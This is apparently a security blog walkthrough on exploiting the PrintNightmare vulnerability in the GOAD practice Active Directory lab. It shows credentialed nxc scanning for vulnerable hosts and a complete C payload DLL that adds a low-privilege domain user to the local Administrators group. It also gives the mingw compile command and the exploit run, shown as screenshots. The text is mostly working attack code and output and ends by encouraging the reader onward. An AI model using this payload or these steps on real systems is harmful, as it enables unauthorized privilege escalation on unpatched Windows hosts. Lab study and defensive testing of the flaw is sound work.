---
layout: default
title : nighthawk - Printnightmare - Authenticated Privilege Esacalation
---

### Description
The vulnerability printnightmare is often found in Active Directory environment, we will look on how to exploit it instead of triggering RCE that gets flagged majority of the time. we will just add our low level user to local admin group

### CVE
(CVE-2021-1675 / CVE-2021-34527)

### Steps to exploit

>First using the nxc smb module `printnightmare` to find the vulnerable target.

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD]
└─$ nxc smb ips.txt -u jon.snow -p iknownothing -M printnightmare 
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:None)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\jon.snow:iknownothing 
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\jon.snow:iknownothing 
SMB         192.168.56.10   445    KINGSLANDING     [-] sevenkingdoms.local\jon.snow:iknownothing STATUS_LOGON_FAILURE 
PRINTNIG... 192.168.56.11   445    WINTERFELL       Vulnerable, next step https://github.com/ly4k/PrintNightmare
```
we can see that the ip `.11` is vulnerable. let's exploit away.

>clone the git repo

<img width="806" height="437" alt="image" src="https://github.com/user-attachments/assets/bd64d802-a6a9-4221-84eb-116c40a756e8" />

>now let's make our add to localadmin malicious .c file.

```c
/*
 * PrintNightmare payload DLL
 * Adds north\jon.snow to local Administrators group
 * Uses NetLocalGroupAddMembers API - more reliable than system()
 */
#include <windows.h>
#include <lm.h>
#pragma comment(lib, "netapi32.lib")

BOOL APIENTRY DllMain(HANDLE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        LOCALGROUP_MEMBERS_INFO_3 member;
        WCHAR domainAndUser[] = L"north\\jon.snow";
        WCHAR group[] = L"Administrators";

        member.lgrmi3_domainandname = domainAndUser;

        DWORD rc = NetLocalGroupAddMembers(
            NULL,               // local server
            group,              // group name
            3,                  // level
            (LPBYTE)&member,    // member info
            1                   // count
        );

        // Also try the FQDN format as a fallback
        if (rc != 0) {
            WCHAR fqdnUser[] = L"north.sevenkingdoms.local\\jon.snow";
            member.lgrmi3_domainandname = fqdnUser;
            NetLocalGroupAddMembers(NULL, group, 3, (LPBYTE)&member, 1);
        }
    }
    return TRUE;
}
```

>compile using mingmw

```shell
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD/exploit-printnightmare/PrintNightmare]
└─$ x86_64-w64-mingw32-gcc -shared -o pwn.dll pwn.c -lnetapi32 -s
                                                                                                                                                                                                                                            
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD/exploit-printnightmare/PrintNightmare]
└─$ ls -al  
total 76
drwxrwxr-x 3 n16hth4wk n16hth4wk  4096 Aug  9 07:09 .
drwxrwxr-x 3 n16hth4wk n16hth4wk  4096 Aug  9 07:05 ..
drwxrwxr-x 7 n16hth4wk n16hth4wk  4096 Aug  9 07:05 .git
-rw-rw-r-- 1 n16hth4wk n16hth4wk  1061 Aug  9 07:05 LICENSE
-rwxrwxr-x 1 n16hth4wk n16hth4wk 25861 Aug  9 07:05 printnightmare.py
-rw-rw-r-- 1 n16hth4wk n16hth4wk  1117 Aug  9 07:09 pwn.c
-rwxrwxr-x 1 n16hth4wk n16hth4wk 12288 Aug  9 07:09 pwn.dll
-rw-rw-r-- 1 n16hth4wk n16hth4wk 12797 Aug  9 07:05 README.md
```


>Now let's startup smbserverpy with impacket

<img width="833" height="194" alt="image" src="https://github.com/user-attachments/assets/48f12250-fbab-4a5f-82d6-a336b17699de" />

>Let's exploit

<img width="1217" height="97" alt="image" src="https://github.com/user-attachments/assets/69ad422d-d65c-4080-873a-2ea1e1ca5ead" />

pre exploitation

<img width="1913" height="782" alt="image" src="https://github.com/user-attachments/assets/d789a75e-15c1-4a5f-872d-90d3ce0d41d7" />

Exploit successful and we have localadmin on the target. You know what to do next after getting localadmin on your target. 😜 happy hacking.










